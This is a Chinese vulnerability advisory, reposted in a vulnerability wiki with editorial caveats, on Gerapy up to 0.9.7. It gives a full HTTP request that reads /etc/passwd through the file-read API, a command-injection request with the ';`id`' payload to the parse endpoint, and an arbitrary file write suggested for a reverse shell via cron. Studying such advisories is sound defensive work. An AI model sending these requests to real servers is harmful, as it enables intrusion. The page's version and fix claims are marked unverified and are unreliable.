---
source: "MrWQ/vulnerability-paper"
title: "漏洞预警：Gerapy 项目 的二次漏洞挖掘"
product: "Gerapy"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "<=0.9.7 claimed; authenticated API; root is assumption not guaranteed"
source_url: "https://mp.weixin.qq.com/s/-TkfZru1ED-YRxhPMjPJsA"
source_status: "recorded"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
id: "vw-738be3eac44a1cf91db8d5bb"
entity_id: "ve-738be3eac44a1cf91db8d5bb"
schema_version: "1"
---

# 漏洞预警：Gerapy 项目 的二次漏洞挖掘

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：<=0.9.7 claimed; authenticated API; root is assumption not guaranteed
- 证据范围：Overlaps5/6 but adds file-write analysis and post-clone-fix chronology; preserve unique content

### 本次正文校订

- 按实际内容修正 2 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- Do not merge whole article as duplicate of single read/RCE entries; retain issue-specific evidence
- Root privilege generalization and version/fix timeline need source verification
- File-write request/code only images; no textual endpoint
- Large image separators/marketing, incomplete HTTP Content-Type and copied auth token
- No CVE or patch mapping for three distinct flaws

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
- 验证须使用自有隔离环境的凭据；已暴露的真实凭据应撤销或轮换。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-TkfZru1ED-YRxhPMjPJsA)

![](../../.resource/remote/ec7a4eef6d5371570b1b4fffed32b95c5cc32eb0a6ad73c7c36667ed29f2c253.png)

![](../../.resource/remote/ec7a4eef6d5371570b1b4fffed32b95c5cc32eb0a6ad73c7c36667ed29f2c253.png)

![](../../.resource/remote/41c66fd059bc411a6ea21ba4f775c8c9bb34acb299ef7a081f2c1b061e360137.gif)

![](../../.resource/remote/ec7a4eef6d5371570b1b4fffed32b95c5cc32eb0a6ad73c7c36667ed29f2c253.png)

![](../../.resource/remote/ec7a4eef6d5371570b1b4fffed32b95c5cc32eb0a6ad73c7c36667ed29f2c253.png)

**![](../../.resource/remote/62ec45fc20ac500854a811a22154a8a90a49ed2e322f774d1e88a948bb94d039.png)**  

![](../../.resource/remote/568dd3665af81ce9e9b7a3b31ffbbaebdeb9d34694558d7f23179b5c6ab04285.png)

![](../../.resource/remote/f98e0030950fc0ae653c3808440fabb5c684eb3a46fec4682d7dde26d6b1cf8f.png)

**一****：漏洞描述🐑**

  

继昨天那篇文章的漏洞预警，对该项目再次审计  

![](../../.resource/remote/0aea6fd9bad0b2c6341fb7499a6a7b8dbd3b56fa771753e7c141b6b10b702cd7.png)

![](../../.resource/remote/568dd3665af81ce9e9b7a3b31ffbbaebdeb9d34694558d7f23179b5c6ab04285.png)

![](../../.resource/remote/f98e0030950fc0ae653c3808440fabb5c684eb3a46fec4682d7dde26d6b1cf8f.png)

二:  漏洞影响🐇

  

Gerapy <= 0.9.7

![](../../.resource/remote/568dd3665af81ce9e9b7a3b31ffbbaebdeb9d34694558d7f23179b5c6ab04285.png)

![](../../.resource/remote/f98e0030950fc0ae653c3808440fabb5c684eb3a46fec4682d7dde26d6b1cf8f.png)

三:  漏洞复现🐋

  

登录页面

![](../../.resource/remote/e8a1607f79569ab9c2a3cc828883e6c2bc3d11e097ae38fc12e4d6f33bc3bef7.png)

  

我们首先先查看关键接口文件 gerapy/server/core/urls.py

![](../../.resource/remote/104979b99995eecc8e0556cd14f57961bf33966b1978acb2376526719123d4f0.png)

  

可以看到 api/project/file/read 接口可能与文件读取相关，查看调用的文件  

gerapy/server/core/views.py 中的 project_file_read 方法  

![](../../.resource/remote/b46d96e8d1c4d8e73a1eed896bdd3822906b4f3cf7ee88500e92d70a6db6e0b3.png)

```
@api_view(['POST'])
@permission_classes([IsAuthenticated])
def project_file_read(request):
    """
    get content of project file
    :param request: request object
    :return: file content
    """
    if request.method == 'POST':
        data = json.loads(request.body)
        path = join(data['path'], data['label'])
        # binary file
        with open(path, 'rb') as f:
            return HttpResponse(f.read().decode('utf-8'))
```

  

path 参数与 label 参数皆可控，攻击者只需要传入 json 数据构造特殊请求就可以读取服务器中的文件  

```http
POST /api/project/file/read HTTP/1.1
Host: 
Content-Length: 35
Accept: application/json, text/plain, */*
Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close

{"path":"/etc/", "label":"passwd"}
```

![](../../.resource/remote/ef75c5bb52af098cd58adc6603c2b1b3fdde9bc6f59455b6a21ff18c85d3a2e2.png)

  

我们再继续向下看一些接口，根据漏洞预警描述官方更新最新版已经把昨天说的那个 git clone 命令拼接修复了，我们需要再寻找一个方式获取权限

![](../../.resource/remote/21b7ab6f2c146f99c16b03c8da93c0e31ca6958e9d4313d93690f6658547c7a0.png)

  

我们找到一个参数  spider 为可控参数，使用 Popen 命令执行时我们可以拼接命令造成命令注入，看一下方法对应的 URl 接口  

![](../../.resource/remote/3a8f511a7ddb3168e737af478c10bce5b3734ce9bb1a769fb35fcd32a120cd48.png)

  

构造请求包测试命令执行

```http
POST /api/project/1/parse HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/plain, */*
Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Content-Length: 18

{"spider":";`id`"}
```

![](../../.resource/remote/d10c8b946862d9784e54356c2925987e5cf65ae7e17857356eacaa4f4dab1687.png)

```
我们再往下看文件更新部分代码
```

![](../../.resource/remote/da8aedeb3d709d155298dfa2ea0aa6788964eeaa721966d6726a90611bf4c805.png)

  

path lable code 参数均为用户可控，就导致了任意文件的写入了, 一般项目权限为 root，可以通过写定时任务等方法反弹 shell，用之前任意文件读取确认文件的写入  

![](../../.resource/remote/2c0f99b379048066e39f069d3480b06d76562dc7edd7b9fc09bc108881b227a4.png)

![](../../.resource/remote/a2ae1621f3fd7a0e10f71653953c8d17bdf9ad7e84695a54231c931e6f0e05fd.png)

![](../../.resource/remote/568dd3665af81ce9e9b7a3b31ffbbaebdeb9d34694558d7f23179b5c6ab04285.png)

![](../../.resource/remote/f98e0030950fc0ae653c3808440fabb5c684eb3a46fec4682d7dde26d6b1cf8f.png)

 四:  关于文库🦉

  

https://www.yuque.com/peiqiwiki

![](../../.resource/remote/2b8b6f772a8013a381bb424f7b6b85eefcc2bfea571ad561b190a4674bdd910d.png)

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](../../.resource/remote/ccb7bc5ce7b30b8f99bdeba963cbbbc47267f787b2b78c5fe58adfbaa5f5a97c.png)

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
